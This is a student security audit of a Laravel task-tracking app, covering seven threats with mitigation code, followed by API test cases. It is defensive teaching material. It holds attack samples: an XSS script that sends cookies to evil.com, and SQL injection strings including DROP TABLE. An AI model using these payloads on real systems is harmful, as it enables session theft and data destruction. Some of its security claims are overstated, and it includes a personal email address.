# DevTracker – Security Audit Report
**Application:** DevTracker (Laravel + Jetstream)  
**Student:** Miyulas Induwara  
**Module:** COMP50016  
**Audit Date:** 2026-05-29  

---

## Overview

DevTracker is a Kanban-style task management application built with Laravel 11, Jetstream, Sanctum, and Tailwind CSS. This document audits threats identified during development and the mitigations applied for each. An API test plan is included at the end.

---

## Threat 1 — SQL Injection

### Description
SQL injection occurs when untrusted user input is concatenated directly into a database query string, allowing an attacker to manipulate the query logic—extracting data, bypassing authentication, or deleting records.

**Example attack:**  
A login form where the email field contains `' OR '1'='1` could make a raw query return all users.

### Mitigation — Laravel Eloquent ORM (Parameterized Queries)
All database queries in DevTracker go through Laravel's Eloquent ORM or the Query Builder, both of which use **PDO prepared statements** internally. User input is always passed as a bound parameter, never concatenated into the query string.

**Code — Task listing filtered by team (`app/Http/Controllers/Api/TaskApiController.php` lines 14–22):**
```php
$tasks = Task::whereHas('project', function ($q) use ($request) {
    $q->where('team_id', $request->user()->currentTeam->id);
})
    ->with(['assignee:id,name', 'project:id,name'])
    ->orderByDesc('created_at')
    ->get();
```
`$request->user()->currentTeam->id` is passed as a bound parameter by Eloquent — the integer value is never embedded in the SQL string.

**Code — Search query (`app/Http/Controllers/SearchController.php` lines 22–32, uses `LIKE` via Query Builder):**

Even when searching with a user-supplied string, the application calls:
```php
->where('name', 'like', "%{$q}%")
->orWhere('description', 'like', "%{$q}%")
// ...
->where('title', 'like', "%{$q}%")
->orWhere('description', 'like', "%{$q}%")
```
Laravel's query builder automatically parameterizes `$q` using a `?` placeholder in the prepared statement, so a value like `%'; DROP TABLE users;--` is treated as a literal string.

**Status: PROTECTED — No raw SQL queries found in the codebase. All queries use Eloquent ORM with automatic parameterization.**

---

## Threat 2 — Cross-Site Scripting (XSS)

### Description
XSS occurs when an application renders user-supplied data as unescaped HTML. An attacker who can store or reflect malicious JavaScript (e.g., `<script>document.location='https://evil.com?c='+document.cookie</script>`) can steal session cookies, deface pages, or hijack accounts.

There are two patterns in DevTracker:

### 2a — Standard output (Blade `{{ }}` escaping) — SAFE

Blade's double-curly-brace syntax **automatically** calls PHP's `htmlspecialchars()` on every value.

**Code — Task title rendered in a view (`resources/views/tasks/show.blade.php` line 46):**
```blade
{{ $task->title }}
```
A title stored as `<script>alert(1)</script>` is output as `&lt;script&gt;alert(1)&lt;/script&gt;` — plain text in the browser, never executed.

### 2b — Search highlighting (potential risk — mitigated by `e()`) 

The search results view must render HTML `<mark>` tags around matched text. This requires `{!! !!}` (raw output), which would be dangerous if the content were unescaped. The mitigation is applying Laravel's `e()` escape function to the content **before** the regex replacement:

**Code — Search highlighting (`resources/views/search/index.blade.php` lines 61–63, 65–67, 116–118):**
```blade
{!! preg_replace(
    '/(' . preg_quote($q, '/') . ')/i',
    '<mark class="bg-neon-green text-black px-0.5">$1</mark>',
    e($project->name)
) !!}
```

**Why this is safe:**
- `e($project->name)` — the project name is HTML-escaped first (`<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, etc.)
- `preg_quote($q, '/')` — the search query is regex-escaped, preventing regex injection
- The `$1` backreference captures text from the already-escaped name string
- The only HTML tags ever introduced are the hardcoded `<mark>` tags — no user content is placed inside tag attributes or unescaped

**Status: PROTECTED — Standard views use `{{ }}` auto-escaping; the one `{!! !!}` site applies `e()` before rendering.**

---

## Threat 3 — Cross-Site Request Forgery (CSRF)

### Description
CSRF tricks an authenticated user into submitting a forged request to a site they are logged into. For example, a malicious page could make the user's browser silently POST to `DELETE /projects/5`, deleting their project.

### Mitigation — Laravel CSRF Middleware + `@csrf` Blade Directive

Laravel's `web` middleware group includes `VerifyCsrfToken` by default. Every state-changing HTML form includes the `@csrf` directive, which embeds a hidden token tied to the user's session.

**Code — Task update form (`resources/views/tasks/show.blade.php` lines 51–52):**
```blade
<form action="{{ route('tasks.update', $task) }}" method="POST">
    @csrf @method('PATCH')
```

**Code — Project creation form (`resources/views/projects/create.blade.php` line 14):**
```blade
@csrf
```

Any POST/PATCH/DELETE request without a matching CSRF token returns HTTP 419. A forged request from another domain cannot read the token, so the attack is blocked.

**API routes** (`routes/api.php`) are **excluded** from CSRF verification — intentionally, because API clients authenticate via a Sanctum Bearer token in the `Authorization` header rather than a session cookie.

**Status: PROTECTED — All web forms include `@csrf`. API uses stateless Bearer token auth.**

---

## Threat 4 — Broken Authentication / Brute Force

### Description
Without rate limiting, an attacker can automate thousands of password guesses against a login endpoint until a valid credential is found.

### Mitigation — Fortify Throttling (Web) + Bcrypt (Rounds = 12)

The web login route is protected by Laravel Fortify's built-in `throttle:login` rate limiter, which locks a combination of email + IP after too many failed attempts.

**Code — Password hashing configuration (`.env`):**
```
BCRYPT_ROUNDS=12
```

**Code — Password field cast (`app/Models/User.php` lines 48–57):**
```php
protected function casts(): array
{
    return [
        'email_verified_at' => 'datetime',
        'last_login_at'     => 'datetime',
        'password'          => 'hashed',
        'is_admin'          => 'boolean',
        'is_banned'         => 'boolean',
        'is_onboarded'      => 'boolean',
    ];
}
```

Bcrypt with 12 rounds makes each hash computation slow (~250 ms), making bulk brute-force impractical. Even if the database were leaked, cracking passwords would take years per hash.

**Two-Factor Authentication (2FA)** is enabled via Jetstream (`TwoFactorAuthenticatable` trait on the User model), providing a second layer of defence after correct password entry.

**Partial Gap — API Login Rate Limiting (`routes/api.php` line 9):**  
`POST /api/login` currently has no explicit `throttle` middleware. This is a known gap:
```php
// Current code — no rate limiting
Route::post('/login', [AuthController::class, 'login']);

// Recommended fix
Route::post('/login', [AuthController::class, 'login'])
    ->middleware('throttle:5,1');   // 5 attempts per minute per IP
```

**Status: PARTIALLY PROTECTED — Web login throttled by Fortify; API login lacks explicit throttle.**

---

## Threat 5 — Broken Access Control (Unauthorized Resource Access)

### Description
A user in Team A should not be able to view, edit, or delete resources belonging to Team B. Without authorization checks, simply changing an ID in the URL could expose another team's data.

### Mitigation — Team Ownership Checks (`abort_unless`) + AdminMiddleware + EnsureNotBanned

Every controller method that accesses a resource verifies that the resource belongs to the authenticated user's current team before proceeding.

**Code — API task access check (`app/Http/Controllers/Api/TaskApiController.php` lines 25–32):**
```php
public function show(Request $request, Task $task): JsonResponse
{
    abort_unless($request->user()->currentTeam->id === $task->project->team_id, 403);

    return response()->json(
        $task->load(['assignee:id,name', 'project:id,name', 'labels:id,name,color'])
    );
}
```

**Code — Admin-only route guard (`app/Http/Middleware/AdminMiddleware.php` lines 10–18):**
```php
public function handle(Request $request, Closure $next): Response
{
    if (!$request->user()?->is_admin) {
        abort(403, 'Access denied.');
    }

    return $next($request);
}
```

**Code — Banned user session invalidation (`app/Http/Middleware/EnsureNotBanned.php` lines 11–24):**
```php
public function handle(Request $request, Closure $next): Response
{
    if ($request->user()?->is_banned) {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login')
            ->withErrors(['email' => 'Your account has been banned. Contact support.']);
    }

    return $next($request);
}
```
`session()->invalidate()` destroys the session; `regenerateToken()` prevents session fixation.

**Status: PROTECTED — All resource endpoints check team membership. Admin and ban states are enforced at middleware level.**

---

## Threat 6 — Mass Assignment

### Description
Laravel's `Model::create($request->all())` can assign any field in the request body to the model. If sensitive fields like `is_admin` are in `$fillable` and the controller blindly passes all request input, an attacker could POST `is_admin=1` during registration to elevate their privilege.

### Mitigation — Explicit Field Whitelisting in `$fillable` + Controlled Assignment in `CreateNewUser`

**Code — User model `$fillable` (`app/Models/User.php` lines 27–35):**
```php
protected $fillable = [
    'name',
    'email',
    'password',
    'is_admin',
    'is_banned',
    'last_login_at',
    'is_onboarded',
];
```

While `is_admin` appears in `$fillable`, the registration action **explicitly** constructs the array passed to `User::create()` and never includes `is_admin` or `is_banned`:

**Code — Registration (`app/Actions/Fortify/CreateNewUser.php` lines 33–39):**
```php
return tap(User::create([
    'name'     => $input['name'],
    'email'    => $input['email'],
    'password' => Hash::make($input['password']),
]), function (User $user) use ($input) {
    $this->createTeam($user);
    ...
});
```

Only the three safe fields are passed. `is_admin` and `is_banned` default to `false` (database default) and can only be set by an admin through a protected admin panel route.

**Status: PROTECTED — Registration and profile update actions use explicit field selection, never `$request->all()`.**

---

## Threat 7 — Insecure File Upload

### Description
Unrestricted file uploads allow attackers to upload malicious files (e.g., a PHP webshell disguised as `image.php.jpg`) that, if executed by the server, grant full system access.

### Mitigation — UUID Filename, Public Storage (No PHP Execution), Size Validation

**Code — Attachment storage (`app/Http/Controllers/AttachmentController.php` lines 14–22):**
```php
abort_unless(auth()->user()->currentTeam->id === $task->project->team_id, 403);

$request->validate(['file' => 'required|file|max:10240']);

$file     = $request->file('file');
$filename = Str::uuid() . '.' . $file->getClientOriginalExtension();
$path     = $file->storeAs('attachments', $filename, 'public');
```

Mitigations applied:
- **UUID filename** — the original filename is discarded; a random UUID is used, preventing directory traversal via filenames like `../../config/app.php`
- **Public disk** — files are stored in `storage/app/public/attachments/`, which is served as static files by the web server. Apache/Nginx will not execute `.php` files in this directory because PHP is only processed for files served through `index.php`
- **Size limit** — files larger than 10 MB are rejected

**Known gap — MIME type not validated:**  
The validation rule `'file|max:10240'` does not restrict file extensions or MIME types. The recommended addition:
```php
$request->validate([
    'file' => 'required|file|max:10240|mimes:jpg,jpeg,png,gif,pdf,doc,docx,xls,xlsx,txt,zip'
]);
```

**Status: PARTIALLY PROTECTED — UUID filenames and public-disk static serving prevent execution. MIME type whitelisting should be added.**

---

## Summary Table

| # | Threat | OWASP Category | Status |
|---|--------|---------------|--------|
| 1 | SQL Injection | A03 – Injection | ✅ Protected (Eloquent ORM) |
| 2 | XSS | A03 – Injection | ✅ Protected (`{{ }}` + `e()`) |
| 3 | CSRF | A01 – Broken Access Control | ✅ Protected (`@csrf` + Sanctum) |
| 4 | Brute Force / Auth | A07 – Auth Failures | ⚠ Partial (web throttled; API gap) |
| 5 | Broken Access Control | A01 – Broken Access Control | ✅ Protected (`abort_unless` + middleware) |
| 6 | Mass Assignment | A08 – Software/Data Integrity | ✅ Protected (explicit field selection) |
| 7 | Insecure File Upload | A04 – Insecure Design | ⚠ Partial (UUID names; MIME gap) |

---

---

# API Test Cases

The DevTracker REST API (`/api/*`) uses **Laravel Sanctum** Bearer tokens. The base URL is `http://localhost/devtracker-laravel/public/api`.

---

## Authentication — `POST /api/login`

### TC-01 — Valid credentials return token

**Request:**
```http
POST /api/login
Content-Type: application/json

{
  "email": "miyulasinduwara2@gmail.com",
  "password": "correct-password"
}
```
**Expected Response — 200 OK:**
```json
{
  "token": "1|abc123...",
  "user": {
    "id": 1,
    "name": "Miyulas",
    "email": "miyulasinduwara2@gmail.com"
  }
}
```

---

### TC-02 — Wrong password returns 401

**Request:**
```http
POST /api/login
Content-Type: application/json

{ "email": "miyulasinduwara2@gmail.com", "password": "wrong-password" }
```
**Expected Response — 401 Unauthorized:**
```json
{ "message": "Invalid credentials." }
```

---

### TC-03 — Missing fields return 422 validation error

**Request:**
```http
POST /api/login
Content-Type: application/json

{ "email": "not-an-email" }
```
**Expected Response — 422 Unprocessable Entity:**
```json
{
  "errors": {
    "email": ["The email must be a valid email address."],
    "password": ["The password field is required."]
  }
}
```

---

### TC-04 — SQL injection attempt in email field is rejected safely

**Request:**
```http
POST /api/login
Content-Type: application/json

{ "email": "' OR '1'='1", "password": "anything" }
```
**Expected Response — 422 (fails `email` validation rule, never hits the database):**
```json
{ "errors": { "email": ["The email must be a valid email address."] } }
```

---

## Task Index — `GET /api/tasks`

### TC-05 — Authenticated user receives their team's tasks

**Request:**
```http
GET /api/tasks
Authorization: Bearer <token-from-TC-01>
```
**Expected Response — 200 OK:**
```json
[
  {
    "id": 12,
    "title": "Set up CI pipeline",
    "status": "doing",
    "priority": "critical",
    "project": { "id": 3, "name": "DevTracker" },
    "assignee": { "id": 1, "name": "Miyulas" }
  }
]
```

---

### TC-06 — Request without token returns 401

**Request:**
```http
GET /api/tasks
```
**Expected Response — 401 Unauthorized:**
```json
{ "message": "Unauthenticated." }
```

---

## Task Show — `GET /api/tasks/{id}`

### TC-07 — User can retrieve a task from their own team

**Request:**
```http
GET /api/tasks/12
Authorization: Bearer <token>
```
**Expected Response — 200 OK** with full task including labels.

---

### TC-08 — User cannot access a task belonging to another team (broken access control test)

**Request:**
```http
GET /api/tasks/999
Authorization: Bearer <token-for-team-A>
```
*(Task 999 belongs to Team B)*

**Expected Response — 403 Forbidden:**
```json
{ "message": "This action is unauthorized." }
```

---

## Task Create — `POST /api/tasks`

### TC-09 — Valid task creation returns 201

**Request:**
```http
POST /api/tasks
Authorization: Bearer <token>
Content-Type: application/json

{
  "project_id": 3,
  "title": "Write unit tests",
  "priority": "normal",
  "status": "todo",
  "story_points": 5
}
```
**Expected Response — 201 Created:**
```json
{
  "id": 25,
  "title": "Write unit tests",
  "priority": "normal",
  "status": "todo",
  "story_points": 5,
  "project_id": 3
}
```

---

### TC-10 — Cannot create task in another team's project (authorization)

**Request:**
```http
POST /api/tasks
Authorization: Bearer <token-for-team-A>
Content-Type: application/json

{ "project_id": 99, "title": "Malicious task" }
```
*(Project 99 belongs to Team B)*

**Expected Response — 403 Forbidden**

---

### TC-11 — Missing required `title` returns validation error

**Request:**
```http
POST /api/tasks
Authorization: Bearer <token>
Content-Type: application/json

{ "project_id": 3 }
```
**Expected Response — 422 Unprocessable Entity:**
```json
{ "errors": { "title": ["The title field is required."] } }
```

---

### TC-12 — Invalid enum value for `priority` is rejected

**Request:**
```http
POST /api/tasks
Authorization: Bearer <token>
Content-Type: application/json

{ "project_id": 3, "title": "Test", "priority": "extreme" }
```
**Expected Response — 422 Unprocessable Entity:**
```json
{ "errors": { "priority": ["The selected priority is invalid."] } }
```

---

## Task Update — `PATCH /api/tasks/{id}`

### TC-13 — Partial update of own team's task

**Request:**
```http
PATCH /api/tasks/12
Authorization: Bearer <token>
Content-Type: application/json

{ "status": "done" }
```
**Expected Response — 200 OK** with updated task object.

---

### TC-14 — Cannot update another team's task

**Request:**
```http
PATCH /api/tasks/999
Authorization: Bearer <token-for-team-A>
Content-Type: application/json

{ "status": "done" }
```
**Expected Response — 403 Forbidden**

---

## Task Delete — `DELETE /api/tasks/{id}`

### TC-15 — Authenticated user can delete their team's task

**Request:**
```http
DELETE /api/tasks/12
Authorization: Bearer <token>
```
**Expected Response — 204 No Content** (empty body)

---

### TC-16 — Cannot delete another team's task

**Request:**
```http
DELETE /api/tasks/999
Authorization: Bearer <token-for-team-A>
```
**Expected Response — 403 Forbidden**

---

## Logout — `POST /api/logout`

### TC-17 — Token is revoked on logout

**Step 1 — Logout:**
```http
POST /api/logout
Authorization: Bearer <token>
```
**Expected Response — 200 OK:**
```json
{ "message": "Token revoked." }
```

**Step 2 — Use the same token again:**
```http
GET /api/tasks
Authorization: Bearer <revoked-token>
```
**Expected Response — 401 Unauthorized:**
```json
{ "message": "Unauthenticated." }
```

---

## Critical Function — `GET /api/user`

### TC-18 — Sensitive fields are excluded from the user response

**Request:**
```http
GET /api/user
Authorization: Bearer <token>
```
**Expected Response — 200 OK:**
```json
{
  "id": 1,
  "name": "Miyulas",
  "email": "miyulasinduwara2@gmail.com"
}
```

The response must **not** include `password`, `remember_token`, `two_factor_secret`, `is_admin`, or `is_banned`. The controller uses `.only('id', 'name', 'email')` and the User model hides sensitive fields via `$hidden`.

---

*End of security audit.*
